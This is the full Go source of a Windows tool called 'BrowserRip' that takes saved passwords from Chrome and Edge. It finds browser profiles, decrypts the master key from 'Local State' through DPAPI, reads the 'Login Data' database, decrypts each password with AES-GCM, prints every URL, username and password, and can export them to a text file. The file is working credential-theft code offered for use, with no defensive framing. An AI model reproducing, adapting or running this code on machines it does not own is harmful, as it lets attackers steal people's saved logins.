package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/fatih/color"
	_ "modernc.org/sqlite"
	"golang.org/x/sys/windows"
	"unsafe"
)

// Browser represents a browser type and its user data path
type Browser struct {
	Name     string
	UserData string
	Profiles []Profile
}

// Profile represents a browser profile with its paths
type Profile struct {
	Name           string
	LocalStatePath string
	LoginDataPath  string
}

// Credential holds the decrypted website credentials
type Credential struct {
	Browser  string
	Profile  string
	URL      string
	Username string
	Password string
}

// ASCII Art Header
func printHeader() {
	color.Cyan(`
==============================================
 _                             _     
| |_ ___ ___ _ _ _ ___ ___ ___|_|___ 
| . |  _| . | | | |_ -| -_|  _| | . |
|___|_| |___|_____|___|___|_| |_|  _|
      -x- w0rmer -x-            |_|    
==============================================
 BrowserRip - Edge & Chrome Pass Extractor
==============================================
`)
}

// ASCII Art Footer
func printFooter() {
	color.Cyan(`
==============================================
        Credential extraction complete!
==============================================
`)
}

// findBrowsers detects Edge and Chrome profiles
func findBrowsers() ([]Browser, error) {
	userDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get user home directory: %v", err)
	}

	browsers := []Browser{
		{"Microsoft Edge", filepath.Join(userDir, "AppData\\Local\\Microsoft\\Edge\\User Data"), nil},
		{"Google Chrome", filepath.Join(userDir, "AppData\\Local\\Google\\Chrome\\User Data"), nil},
	}

	var result []Browser
	for _, browser := range browsers {
		if _, err := os.Stat(browser.UserData); os.IsNotExist(err) {
			continue
		}

		var profiles []Profile
		localStatePath := filepath.Join(browser.UserData, "Local State")
		filepath.Walk(browser.UserData, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if info.IsDir() && (info.Name() == "Default" || strings.HasPrefix(info.Name(), "Profile ")) {
				loginDataPath := filepath.Join(path, "Login Data")
				if _, err := os.Stat(loginDataPath); err == nil {
					profiles = append(profiles, Profile{info.Name(), localStatePath, loginDataPath})
				}
			}
			return nil
		})

		if len(profiles) > 0 {
			browser.Profiles = profiles
			result = append(result, browser)
		}
	}
	return result, nil
}

// getAESKey decrypts the AES key from Local State
func getAESKey(localStatePath string) ([]byte, error) {
	data, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %v", err)
	}

	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, fmt.Errorf("failed to parse Local State JSON: %v", err)
	}

	osCrypt, ok := state["os_crypt"].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("os_crypt not found")
	}

	encKey, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("encrypted_key not found")
	}

	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, err
	}

	if !strings.HasPrefix(string(key), "DPAPI") {
		return nil, fmt.Errorf("encrypted_key doesn't have DPAPI prefix")
	}

	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(key[5:])),
		Data: &key[5:][0],
	}

	err = windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	if err != nil {
		return nil, fmt.Errorf("DPAPI decryption error: %v", err)
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))

	decryptedKey := make([]byte, outBlob.Size)
	copy(decryptedKey, unsafe.Slice(outBlob.Data, outBlob.Size))

	return decryptedKey, nil
}

// decryptPassword decrypts AES-GCM passwords
func decryptPassword(encrypted, key []byte) (string, error) {
	if len(encrypted) < 15 {
		return "", fmt.Errorf("encrypted password too short")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := encrypted[3:15]
	ciphertext := encrypted[15:]
	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	return string(plaintext), err
}

func main() {
	exportFile := flag.String("export", "", "Export credentials to a text file")
	flag.Parse()

	printHeader()

	browsers, err := findBrowsers()
	if err != nil || len(browsers) == 0 {
		log.Fatal("No browsers found.")
	}

	var credentials []Credential
	counter := 1
	colors := []*color.Color{color.New(color.FgGreen), color.New(color.FgYellow)}

	for _, browser := range browsers {
		for _, profile := range browser.Profiles {
			aesKey, err := getAESKey(profile.LocalStatePath)
			if err != nil {
				log.Println(err)
				continue
			}

			db, err := sql.Open("sqlite", profile.LoginDataPath)
			if err != nil {
				log.Println(err)
				continue
			}

			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
			if err != nil {
				log.Println(err)
				db.Close()
				continue
			}

			for rows.Next() {
				var url, user string
				var encPass []byte
				rows.Scan(&url, &user, &encPass)
				pass, err := decryptPassword(encPass, aesKey)
				if err == nil {
					credentials = append(credentials, Credential{browser.Name, profile.Name, url, user, pass})
					colors[counter%2].Printf("[%d] %s | %s | %s\n", counter, url, user, pass)
					counter++
				}
			}
			rows.Close()
			db.Close()
		}
	}

	if *exportFile != "" {
		f, err := os.Create(*exportFile)
		if err != nil {
			log.Fatalf("Failed to create export file: %v", err)
		}
		defer f.Close()
		for i, cred := range credentials {
			fmt.Fprintf(f, "[%d] %s | %s | %s | %s | %s\n", i+1, cred.Browser, cred.Profile, cred.URL, cred.Username, cred.Password)
		}
		color.Green("\nCredentials exported to %s\n", *exportFile)
	}

	printFooter()
}